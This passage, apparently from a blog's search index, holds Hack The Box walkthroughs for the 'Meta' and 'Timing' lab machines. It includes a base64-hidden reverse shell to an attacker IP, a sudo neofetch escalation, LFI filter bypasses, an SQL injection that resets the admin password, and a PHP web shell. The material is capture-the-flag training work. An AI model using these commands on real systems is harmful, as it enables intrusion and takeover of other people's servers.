`Y$$b. `\"Y$b._ `\"\"\"  Actually, we can use a configuration file that will be executed when running neofetch. Here we can see an example of such configuration file.\nSince we cannot modify the command, we need to name the configuration file as the default one, which is ~/.config/neofetch/config.conf. But we need to set an environment variable named XDG_CONFIG_HOME, according to the source:\nget_user_config() { # --config /path/to/config.conf if[[ -f\"$config_file\"]];then source\"$config_file\" err \"Config: Sourced user config. (${config_file})\" return elif[[ -f\"${XDG_CONFIG_HOME}/neofetch/config.conf\"]];then source\"${XDG_CONFIG_HOME}/neofetch/config.conf\" err \"Config: Sourced user config. (${XDG_CONFIG_HOME}/neofetch/config.conf)\" elif[[ -f\"${XDG_CONFIG_HOME}/neofetch/config\"]];then source\"${XDG_CONFIG_HOME}/neofetch/config\" err \"Config: Sourced user config. (${XDG_CONFIG_HOME}/neofetch/config)\" elif[[ -z\"$no_config\"]];then config_file=\"${XDG_CONFIG_HOME}/neofetch/config.conf\" # The config file doesn't exist, create it. mkdir -p \"${XDG_CONFIG_HOME}/neofetch/\" printf'%s\\n'\"$config\"\u0026gt;\"$config_file\" fi }  Since this is going to be executed by root (using sudo), let\u0026rsquo;s enter another reverse shell:\nthomas@meta:~$ cat \u0026gt; .config/neofetch/config.conf echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash ^C thomas@meta:~$ export XDG_CONFIG_HOME=/home/thomas/.config  We can execute any command. For more information, we can go to GTFOBins, or use my tool gtfobins-cli:\n$ gtfobins-cli --sudo neofetch neofetch ==\u0026gt; https://gtfobins.github.io/gtfobins/neofetch/ Sudo If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access. TF=$(mktemp) echo 'exec /bin/sh' \u0026gt;$TF sudo neofetch --config $TF  And if we run neofetch with sudo, we get the reverse shell as root:\n$ nc -nlvp 4444 Ncat: Version 7.93 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.140. Ncat: Connection from 10.10.11.140:52892. root@meta:/home/thomas# script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null root@meta:/home/thomas# ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm root@meta:/home/thomas# export TERM=xterm root@meta:/home/thomas# export SHELL=bash root@meta:/home/thomas# stty rows 50 columns 158 root@meta:/home/thomas# cd root@meta:~# cat root.txt 5ace1c9be16771a731dde13dcd8d186e  ","image":"/images/HTB/Meta/Meta.png","permalink":"https://7rocky.github.io/en/htb/meta/","section":"htb","summary":"Hack The Box. Linux. Medium machine. This machine has a website that analyzes uploaded images with a vulnerable version of exiftool that leads to RCE. Then, there is a Cron job that transforms images using ImageMagick\u0026rsquo;s mogrify command, which is vulnerable to command injection. Finally, we have sudo permissions on neofetch, which leads to privilege escalation","time":8,"title":"Meta"},{"contents":"  OS: Linux   Difficulty: Medium   IP Address: 10.10.11.135   Release: 11 / 12 / 2021   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.135 -p 22,80 Nmap scan report for 10.10.11.135 Host is up (0.053s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 d2:5c:40:d7:c9:fe:ff:a8:83:c3:6e:cd:60:11:d2:eb (RSA) | 256 18:c9:f7:b9:27:36:a1:16:59:23:35:84:34:31:b3:ad (ECDSA) |_ 256 a2:2d:ee:db:4e:bf:f9:3f:8b:d4:cf:b4:12:d8:20:f2 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-title: Simple WebApp |_Requested resource was ./login.php |_http-server-header: Apache/2.4.29 (Ubuntu) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 10.51 seconds  This machine has ports 22 (SSH) and 80 (HTTP) open.\nWeb enumeration If we go to http://10.10.11.135 we will be redirected to a login form (/login.php):\nWe can try some default credentials but we get an error message:\nHowever, due to the name of the machine (\u0026ldquo;Timing\u0026rdquo;), we might think of timing attacks. Here we have a simple proof of concept using curl:\n$ time curl '10.10.11.135/login.php?login=true' -sd 'user=admin\u0026password=x' \u0026gt; /dev/null 1,36 real 0,01 user 0,00 sys $ time curl '10.10.11.135/login.php?login=true' -sd 'user=asdf\u0026password=x' \u0026gt; /dev/null 0,24 real 0,01 user 0,00 sys  So we must guess that admin is a valid username. Let\u0026rsquo;s enumerate more users using ffuf and this timing oracle:\n$ ffuf -w $WORDLISTS/names.txt -u 'http://10.10.11.135/login.php?login=true' -H 'Content-Type: application/x-www-form-urlencoded' -d 'user=FUZZ\u0026password=asdf' -t 5 -ft '\u0026lt;1000' aaron [Status: 200, Size: 5963, Words: 1878, Lines: 188, Duration: 1149ms] admin [Status: 200, Size: 5963, Words: 1878, Lines: 188, Duration: 1507ms]  Notice that I used 5 threads, if not we would get false positives. We can try to get their passwords, but they do not follow the same timing oracle.\nSo we need to continue enumerating. Let\u0026rsquo;s find more routes and files with ffuf:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.135/FUZZ -e .php images [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 138ms] login.php [Status: 200, Size: 5609, Words: 1755, Lines: 178, Duration: 50ms] profile.php [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 68ms] image.php [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 39ms] header.php [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 72ms] footer.php [Status: 200, Size: 3937, Words: 1307, Lines: 116, Duration: 60ms] upload.php [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 74ms] css [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 81ms] index.php [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 4219ms] js [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 80ms] logout.php [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 104ms] [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 80ms] .php [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 80ms] server-status [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 60ms]  Finding LFI Notice that there is a strange file called image.php that gives 200 OK but no response body. Because of the name of the file, we might try to use some parameter and point it to a file. For instance, let\u0026rsquo;s use ffuf again to see if we get the parameter name (we need to provide a valid file like /etc/passwd):\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u 'http://10.10.11.135/image.php?FUZZ=/etc/passwd' -fs 0 img [Status: 200, Size: 25, Words: 3, Lines: 1, Duration: 3158ms]  There it is, and it has a response body, let\u0026rsquo;s read it:\n$ curl '10.10.11.135/image.php?img=/etc/passwd' Hacking attempt detected!  Wow, they caught us. We have a potential Local File Inclusion (LFI). We know this because if we point the parameter to index.php we don\u0026rsquo;t get any output and we get redirected to /login.php (so the PHP code is executed):\n$ curl '10.10.11.135/image.php?img=index.php' -i HTTP/1.1 302 Found Date: Server: Apache/2.4.29 (Ubuntu) Set-Cookie: PHPSESSID=3t8sqtja7l7ea3h3v9f904pc1l; expires=Wed, 01-Jun-2022 17:35:16 GMT; Max-Age=3600; path=/ Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Pragma: no-cache Location: ./login.php Content-Length: 0 Content-Type: text/html; charset=UTF-8  However, we can extract the PHP source code using a PHP wrapper to convert it to Base64 encoding, so that there are no \u0026lt;?php tags and the content is not executed. This is index.php:\n$ curl '10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=index.php' PD9waHAKaW5jbHVkZV9vbmNlICJoZWFkZXIucGhwIjsKPz4KCjxoMSBjbGFzcz0idGV4dC1jZW50ZXIiIHN0eWxlPSJwYWRkaW5nOiAyMDBweCI+WW91IGFyZSBsb2dnZWQgaW4gYXMgdXNlciA8P3BocCBlY2hvICRfU0VTU0lPTlsndXNlcmlkJ107ID8+ITwvaDE+Cgo8P3BocAppbmNsdWRlX29uY2UgImZvb3Rlci5waHAiOwo/Pgo= $ curl '10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=index.php' -s | base64 -d  \u0026lt;?php include_once \"header.php\"; ?\u0026gt; \u0026lt;h1 class=\"text-center\" style=\"padding: 200px\"\u0026gt;You are logged in as user \u0026lt;?php echo $_SESSION['userid']; ?\u0026gt;!\u0026lt;/h1\u0026gt; \u0026lt;?php include_once \"footer.php\"; ?\u0026gt;  Analyzing PHP source code Now we can read the PHP source code. I will create a Bash function to read the files easily:\n$ function read_file() { curl \"10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=$1\" -s | base64 -d; }  This is login.php, let\u0026rsquo;s see how the password is checked:\n$ read_file login.php  \u0026lt;?php include \"header.php\"; function createTimeChannel() { sleep(1); } include \"db_conn.php\"; if (isset($_SESSION['userid'])){ header('Location: ./index.php'); die(); } if (isset($_GET['login'])) { $username = $_POST['user']; $password = $_POST['password']; $statement = $pdo-\u0026gt;prepare(\"SELECT * FROM users WHERE username = :username\"); $result = $statement-\u0026gt;execute(array('username' =\u0026gt; $username)); $user = $statement-\u0026gt;fetch(); if ($user !== false) { createTimeChannel(); if (password_verify($password, $user['password'])) { $_SESSION['userid'] = $user['id']; $_SESSION['role'] = $user['role']; header('Location: ./index.php'); return; } } $errorMessage = \"Invalid username or password entered\"; } ?\u0026gt; \u0026lt;!-- ... --\u0026gt;  It uses password_verify, which is not affected by timing attacks (as stated in www.php.net).\nWe can find database credentials in db_conn.php (which is called in login.php):\n$ read_file db_conn.php  \u0026lt;?php $pdo = new PDO('mysql:host=localhost;dbname=app', 'root', '4_V3Ry_l0000n9_p422w0rd');  We may try to reuse these credentials for admin or aaron in the website, or even for aaron in SSH. We know that it is a valid user because it appears in /etc/passwd:\n$ read_file /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false sshd:x:110:65534::/run/sshd:/usr/sbin/nologin mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false aaron:x:1000:1000:aaron:/home/aaron:/bin/bash  Actually, this is the file we are currently exploiting:\n$ read_file image.php  \u0026lt;?php function is_safe_include($text) { $blacklist = array(\"php://input\", \"phar://\", \"zip://\", \"ftp://\", \"file://\", \"http://\", \"data://\", \"expect://\", \"https://\", \"../\"); foreach ($blacklist as $item) { if (strpos($text, $item) !== false) { return false; } } return substr($text, 0, 1) !== \"/\"; } if (isset($_GET['img'])) { if (is_safe_include($_GET['img'])) { include($_GET['img']); } else { echo \"Hacking attempt detected!\"; } }  Indeed, we are exploiting a Local File Inclusion vulnerability (notice the use of the include function). We could have also used uppercase letters to bypass filters:\n$ curl '10.10.11.135/image.php?img=File:///etc/hosts' 127.0.0.1 localhost timing.htb 127.0.1.1 timing # The following lines are desirable for IPv6 capable hosts ::1 ip6-localhost ip6-loopback fe00::0 ip6-localnet ff00::0 ip6-mcastprefix ff02::1 ip6-allnodes ff02::2 ip6-allrouters  Now we should upgrade the LFI to a Remote Code Execution (RCE). Recall that ffuf showed a file named upload.php:\n$ read_file upload.php  \u0026lt;?php include(\"admin_auth_check.php\"); $upload_dir = \"images/uploads/\"; if (!file_exists($upload_dir)) { mkdir($upload_dir, 0777, true); } $file_hash = uniqid(); $file_name = md5('$file_hash' . time()) . '_' . basename($_FILES[\"fileToUpload\"][\"name\"]); $target_file = $upload_dir . $file_name; $error = \"\"; $imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION)); if (isset($_POST[\"submit\"])) { $check = getimagesize($_FILES[\"fileToUpload\"][\"tmp_name\"]); if ($check === false) { $error = \"Invalid file\"; } } // Check if file already exists if (file_exists($target_file)) { $error = \"Sorry, file already exists.\"; } if ($imageFileType != \"jpg\") { $error = \"This extension is not allowed.\"; } if (empty($error)) { if (move_uploaded_file($_FILES[\"fileToUpload\"][\"tmp_name\"], $target_file)) { echo \"The file has been uploaded.\"; } else { echo \"Error: There was an error uploading your file.\"; } } else { echo \"Error: \" . $error; } ?\u0026gt;  This file looks promising. If we were able to upload a PHP file to the server, we could access it though the LFI and gain RCE. But first we need to see what admin_auth_check.php is used for:\n$ read_file admin_auth_check.php  \u0026lt;?php include_once \"auth_check.php\"; if (!isset($_SESSION['role']) || $_SESSION['role'] != 1) { echo \"No permission to access this panel!\"; header('Location: ./index.php'); die(); } ?\u0026gt;  So we need to have a valid session and role equals 1. Notice that they are using != (and not !==), so it is vulnerable to Type Juggling.\nAnd we also need to bypass auth_check.php\u0026hellip;\n$ read_file auth_check.php  \u0026lt;?php //ini_set('display_errors', '1'); //ini_set('display_startup_errors', '1'); //error_reporting(E_ALL); // session is valid for 1 hour ini_set('session.gc_maxlifetime', 3600); session_set_cookie_params(3600); session_start(); if (!isset($_SESSION['userid']) \u0026amp;\u0026amp; strpos($_SERVER['REQUEST_URI'], \"login.php\") === false) { header('Location: ./login.php'); die(); } ?\u0026gt;  Here we have a misconfiguration, can you see it? The program will enter the if block whenever our session is not set and whenever \u0026quot;login.php\u0026quot; is not found in the request URI. Obviously, we cannot get a valid session from scratch (we don\u0026rsquo;t have valid credentials), so\u0026hellip; We must access auth_check.php but somehow add the string \u0026quot;login.php\u0026quot; to the request URI so that the program does not enter the if block.\nWe can do this simply adding login.php as a query parameter. Mind the differences:\n$ curl '10.10.11.135/auth_check.php' -i HTTP/1.1 302 Found Date: Server: Apache/2.4.29 (Ubuntu) Set-Cookie: PHPSESSID=ian71bvoa9a3t6f2l35g53rl4t; expires=Wed, 01-Jun-2022 18:16:54 GMT; Max-Age=3600; path=/ Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Pragma: no-cache Location: ./login.php Content-Length: 0 Content-Type: text/html; charset=UTF-8 $ curl '10.10.11.135/auth_check.php?login.php' -i HTTP/1.1 200 OK Date: Server: Apache/2.4.29 (Ubuntu) Set-Cookie: PHPSESSID=2li2bbhv1cafb9i4jkm74i5392; expires=Wed, 01-Jun-2022 18:16:56 GMT; Max-Age=3600; path=/ Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Pragma: no-cache Content-Length: 0 Content-Type: text/html; charset=UTF-8  So we have a way to bypass auth_check.php. But we can\u0026rsquo;t bypass admin_auth_check.php. Hence, let\u0026rsquo;s continue enumerating.\nThis is profile.php:\n$ read_file profile.php  \u0026lt;?php include_once \"header.php\"; include_once \"db_conn.php\"; $id = $_SESSION['userid']; // fetch updated user $statement = $pdo-\u0026gt;prepare(\"SELECT * FROM users WHERE id = :id\"); $result = $statement-\u0026gt;execute(array('id' =\u0026gt; $id)); $user = $statement-\u0026gt;fetch(); ?\u0026gt; \u0026lt;script src=\"js/profile.js\"\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;div class=\"container bootstrap snippets bootdey\"\u0026gt; \u0026lt;div class=\"alert alert-success\" id=\"alert-profile-update\" style=\"display: none\"\u0026gt; \u0026lt;strong\u0026gt;Success!\u0026lt;/strong\u0026gt; Profile was updated. \u0026lt;/div\u0026gt; \u0026lt;h1 class=\"text-primary\"\u0026gt;\u0026lt;span class=\"glyphicon glyphicon-user\"\u0026gt;\u0026lt;/span\u0026gt;Edit Profile\u0026lt;/h1\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;div class=\"row\"\u0026gt; \u0026lt;!-- left column --\u0026gt; \u0026lt;div class=\"col-md-1\"\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!-- edit form column --\u0026gt; \u0026lt;div class=\"col-md-9 personal-info\"\u0026gt; \u0026lt;h3\u0026gt;Personal info\u0026lt;/h3\u0026gt; \u0026lt;form class=\"form-horizontal\" role=\"form\" id=\"editForm\" action=\"#\" method=\"POST\"\u0026gt; \u0026lt;div class=\"form-group\"\u0026gt; \u0026lt;label class=\"col-lg-3 control-label\"\u0026gt;First name:\u0026lt;/label\u0026gt; \u0026lt;div class=\"col-lg-8\"\u0026gt; \u0026lt;input class=\"form-control\" type=\"text\" name=\"firstName\" id=\"firstName\" value=\"\u0026lt;?php if (!empty($user['firstName'])) echo $user['firstName']; ?\u0026gt;\"\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\"form-group\"\u0026gt; \u0026lt;label class=\"col-lg-3 control-label\"\u0026gt;Last name:\u0026lt;/label\u0026gt; \u0026lt;div class=\"col-lg-8\"\u0026gt; \u0026lt;input class=\"form-control\" type=\"text\" name=\"lastName\" id=\"lastName\" value=\"\u0026lt;?php if (!empty($user['lastName'])) echo $user['lastName']; ?\u0026gt;\"\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\"form-group\"\u0026gt; \u0026lt;label class=\"col-lg-3 control-label\"\u0026gt;Company:\u0026lt;/label\u0026gt; \u0026lt;div class=\"col-lg-8\"\u0026gt; \u0026lt;input class=\"form-control\" type=\"text\" name=\"company\" id=\"company\" value=\"\u0026lt;?php if (!empty($user['company'])) echo $user['company']; ?\u0026gt;\"\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\"form-group\"\u0026gt; \u0026lt;label class=\"col-lg-3 control-label\"\u0026gt;Email:\u0026lt;/label\u0026gt; \u0026lt;div class=\"col-lg-8\"\u0026gt; \u0026lt;input class=\"form-control\" type=\"text\" name=\"email\" id=\"email\" value=\"\u0026lt;?php if (!empty($user['email'])) echo $user['email']; ?\u0026gt;\"\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\"container\"\u0026gt; \u0026lt;div class=\"row\"\u0026gt; \u0026lt;div class=\"col-md-9 bg-light text-right\"\u0026gt; \u0026lt;button type=\"button\" onclick=\"updateProfile()\" class=\"btn btn-primary\"\u0026gt; Update \u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;?php include_once \"footer.php\"; ?\u0026gt;  And it uses auth_check.php, so we can bypass it and access profile.php:\nIf we look at the HTML \u0026lt;form\u0026gt;, it will call updateProfile() using JavaScript. The file is accessible in /js/profile.js:\n$ curl 10.10.11.135/js/profile.js  function updateProfile() { var xml = new XMLHttpRequest(); xml.onreadystatechange = function () { if (xml.readyState == 4 \u0026amp;\u0026amp; xml.status == 200) { document.getElementById(\"alert-profile-update\").style.display = \"block\" } }; xml.open(\"POST\", \"profile_update.php\", true); xml.setRequestHeader(\"Content-type\", \"application/x-www-form-urlencoded\"); xml.send(\"firstName=\" + document.getElementById(\"firstName\").value + \"\u0026amp;lastName=\" + document.getElementById(\"lastName\").value + \"\u0026amp;email=\" + document.getElementById(\"email\").value + \"\u0026amp;company=\" + document.getElementById(\"company\").value); }  The request is performed using AJAX to profile_update.php. Let\u0026rsquo;s read it:\n$ read_file profile_update.php  \u0026lt;?php include \"auth_check.php\"; $error = \"\"; if (empty($_POST['firstName'])) { $error = 'First Name is required.'; } else if (empty($_POST['lastName'])) { $error = 'Last Name is required.'; } else if (empty($_POST['email'])) { $error = 'Email is required.'; } else if (empty($_POST['company'])) { $error = 'Company is required.'; } if (!empty($error)) { die(\"Error updating profile, reason: \" . $error); } else { include \"db_conn.php\"; $id = $_SESSION['userid']; $statement = $pdo-\u0026gt;prepare(\"SELECT * FROM users WHERE id = :id\"); $result = $statement-\u0026gt;execute(array('id' =\u0026gt; $id)); $user = $statement-\u0026gt;fetch(); if ($user !== false) { ini_set('display_errors', '1'); ini_set('display_startup_errors', '1'); error_reporting(E_ALL); $firstName = $_POST['firstName']; $lastName = $_POST['lastName']; $email = $_POST['email']; $company = $_POST['company']; $role = $user['role']; if (isset($_POST['role'])) { $role = $_POST['role']; $_SESSION['role'] = $role; } // dont persist role $sql = \"UPDATE users SET firstName='$firstName', lastName='$lastName', email='$email', company='$company' WHERE id=$id\"; $stmt = $pdo-\u0026gt;prepare($sql); $stmt-\u0026gt;execute(); $statement = $pdo-\u0026gt;prepare(\"SELECT * FROM users WHERE id = :id\"); $result = $statement-\u0026gt;execute(array('id' =\u0026gt; $id)); $user = $statement-\u0026gt;fetch(); // but return it to avoid confusion $user['role'] = $role; $user['6'] = $role; echo json_encode($user, JSON_PRETTY_PRINT); } else { echo \"No user with this id was found.\"; } } ?\u0026gt;  Here we have two things. The first one that jumps out is a SQL injection vulnerability because of string interpolation (the contents of the variables get inserted within the SQL query with no sanitization):\n$sql = \"UPDATE users SET firstName='$firstName', lastName='$lastName', email='$email', company='$company' WHERE id=$id\";  Using SQLi, we can get the contents of the database (namely, the hashed passwords for aaron and admin) and even modify them.\nMoreover, we can assign a role in our current session, which can be used to pass the validation of admin_auth_check.php:\nif (isset($_POST['role'])) { $role = $_POST['role']; $_SESSION['role'] = $role; }  However, we still need a valid user session in order to reach those lines of code.\nBut we can try more things, like password guessing. Unexpectedly, aaron\u0026rsquo;s password is indeed aaron. Now we have legitimate access to profile.php (no bypass needed):\nAt this point, I will change the role to 1 in the user\u0026rsquo;s session. For that, I will still use curl with the corresponding PHPSESSID cookie:\n$ curl '10.10.11.135/login.php?login=true' -sid 'user=aaron\u0026password=aaron' | grep PHPSESSID Set-Cookie: PHPSESSID=3ud32r6h5qk7437rv339e5308a; expires=Wed, 01-Jun-2022 20:17:47 GMT; Max-Age=3600; path=/ $ curl '10.10.11.135/profile_update.php?login.php' -sH 'Cookie: PHPSESSID=3ud32r6h5qk7437rv339e5308a' -d \"firstName=x\u0026lastName=x\u0026email=x\u0026company=x\u0026role=1\" { \"id\": \"2\", \"0\": \"2\", \"username\": \"aaron\", \"1\": \"aaron\", \"password\": \"$2y$10$kbs9MM.M8G.aquRLu53QYO.9tZNFvALOIAb3LwLggUs58OH5mVUFq\", \"2\": \"$2y$10$kbs9MM.M8G.aquRLu53QYO.9tZNFvALOIAb3LwLggUs58OH5mVUFq\", \"lastName\": \"x\", \"3\": \"x\", \"firstName\": \"x\", \"4\": \"x\", \"email\": \"x\", \"5\": \"x\", \"role\": \"1\", \"6\": \"1\", \"company\": \"x\", \"7\": \"x\" } $ curl '10.10.11.135/admin_auth_check.php?login.php' -H 'Cookie: PHPSESSID=3ud32r6h5qk7437rv339e5308a'  So now we have no errors in admin_auth_check.php because our session role is \u0026quot;1\u0026quot;, which has the same value as 1 (Type Juggling).\nJust to show how to exploit SQLi to gain admin access (so that we don\u0026rsquo;t need to change aaron\u0026rsquo;s role), we can use the following payload to modify the password for admin and set it to aaron (we will enter the same hash):\nfirstName=admin',password='$2y$10$kbs9MM.M8G.aquRLu53QYO.9tZNFvALOIAb3LwLggUs58OH5mVUFq' where id=1-- -  $ curl '10.10.11.135/profile_update.php?login.php' -sH 'Cookie: PHPSESSID=3ud32r6h5qk7437rv339e5308a' -d \"firstName=admin',password='\\$2y\\$10\\$kbs9MM.M8G.aquRLu53QYO.9tZNFvALOIAb3LwLggUs58OH5mVUFq'+where+id=1--+-\u0026lastName=x\u0026email=x\u0026company=x\u0026role=1\" { \"id\": \"2\", \"0\": \"2\", \"username\": \"aaron\", \"1\": \"aaron\", \"password\": \"$2y$10$kbs9MM.M8G.aquRLu53QYO.9tZNFvALOIAb3LwLggUs58OH5mVUFq\", \"2\": \"$2y$10$kbs9MM.M8G.aquRLu53QYO.9tZNFvALOIAb3LwLggUs58OH5mVUFq\", \"lastName\": \"x\", \"3\": \"x\", \"firstName\": \"x\", \"4\": \"x\", \"email\": \"x\", \"5\": \"x\", \"role\": \"1\", \"6\": \"1\", \"company\": \"x\", \"7\": \"x\" }  Now we can access with credentials admin:aaron:\nAnd we can see the upload feature directly in the browser:\nGetting RCE At this point, we might want to upload some file with PHP code to gain RCE through the LFI. Let\u0026rsquo;s review the source code for upload.php:\n$ read_file upload.php  \u0026lt;?php include(\"admin_auth_check.php\"); $upload_dir = \"images/uploads/\"; if (!file_exists($upload_dir)) { mkdir($upload_dir, 0777, true); } $file_hash = uniqid(); $file_name = md5('$file_hash' . time()) . '_' . basename($_FILES[\"fileToUpload\"][\"name\"]); $target_file = $upload_dir . $file_name; $error = \"\"; $imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION)); if (isset($_POST[\"submit\"])) { $check = getimagesize($_FILES[\"fileToUpload\"][\"tmp_name\"]); if ($check === false) { $error = \"Invalid file\"; } } // Check if file already exists if (file_exists($target_file)) { $error = \"Sorry, file already exists.\"; } if ($imageFileType != \"jpg\") { $error = \"This extension is not allowed.\"; } if (empty($error)) { if (move_uploaded_file($_FILES[\"fileToUpload\"][\"tmp_name\"], $target_file)) { echo \"The file has been uploaded.\"; } else { echo \"Error: There was an error uploading your file.\"; } } else { echo \"Error: \" . $error; } ?\u0026gt;  There are lots of things to analyze. First of all, the file will be stored at /images/uploads/ and the name of the file will set to:\n$file_hash = uniqid(); $file_name = md5('$file_hash' . time()) . '_' . basename($_FILES[\"fileToUpload\"][\"name\"]);  There is a bug here, because $file_hash does nothing. The use of single quotes instead of double quotes matters here, just test it:\n$ php -a Interactive shell php \u0026gt; $file_hash = uniqid(); php \u0026gt; echo '$file_hash'; $file_hash php \u0026gt; echo \"$file_hash\"; 6297dc93794b4  Moreover, the filename is the MD5 hash of a string with a time value:\nphp \u0026gt; $file = 'r.php'; php \u0026gt; $file_name = md5('$file_hash' . time()) . '_' . basename($file); php \u0026gt; echo $file_name; 8341c71500f186c3ce6ca74204769606_r.php  The string that is hashed is something like this:\nphp \u0026gt; echo '$file_hash' . time(); $file_hash1654119787 php \u0026gt; echo '$file_hash' . time(); $file_hash1654119788 php \u0026gt; echo '$file_hash' . time(); $file_hash1654119789 php \u0026gt; echo '$file_hash' . time(); $file_hash1654119790  It changes every second. There is another check if we send submit in the request form:\nif (isset($_POST[\"submit\"])) { $check = getimagesize($_FILES[\"fileToUpload\"][\"tmp_name\"]); if ($check === false) { $error = \"Invalid file\"; } }  Another important check is the file extension:\n$upload_dir = \"images/uploads/\"; // ... $target_file = $upload_dir . $file_name; $error = \"\"; $imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION)); // ... if ($imageFileType != \"jpg\") { $error = \"This extension is not allowed.\"; }  With r.php, we will get php extension:\nphp \u0026gt; $upload_dir = \"images/uploads/\"; php \u0026gt; $target_file = $upload_dir . $file_name; php \u0026gt; $imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION)); php \u0026gt; echo $imageFileType; php  But if we use r.php.jpg, the file is interpreted as jpg:\nphp \u0026gt; $file = 'r.php.jpg'; php \u0026gt; $file_name = md5('$file_hash' . time()) . '_' . basename($file); php \u0026gt; echo $file_name; 9a3b65d2e18bf402d3715ac15ec5be2a_r.php.jpg php \u0026gt; $target_file = $upload_dir . $file_name; php \u0026gt; $imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION)); php \u0026gt; echo $imageFileType; jpg  If there are no errors, the file gets stored at /images/uploads/:\nif (empty($error)) { if (move_uploaded_file($_FILES[\"fileToUpload\"][\"tmp_name\"], $target_file)) { echo \"The file has been uploaded.\"; } else { echo \"Error: There was an error uploading your file.\"; } } else { echo \"Error: \" . $error; }  At this point, I decided to write a Python script to do everything needed to upload the file and then provide the URL of the filename with the PHP web shell: upload.py (detailed explanation here):\n$ python3 upload.py Cookie: PHPSESSID=dg8sokd2ki84a93ggp2tttrlm6 RCE: http://10.10.11.135/images/uploads/67bcd57488a373e2873212f23c06c222_r.php.jpg $ curl 10.10.11.135/images/uploads/67bcd57488a373e2873212f23c06c222_r.php.jpg \u0026lt;?php system($_GET[\"cmd\"]); ?\u0026gt;  And there we have our web shell. Now we have RCE through LFI:\n$ curl 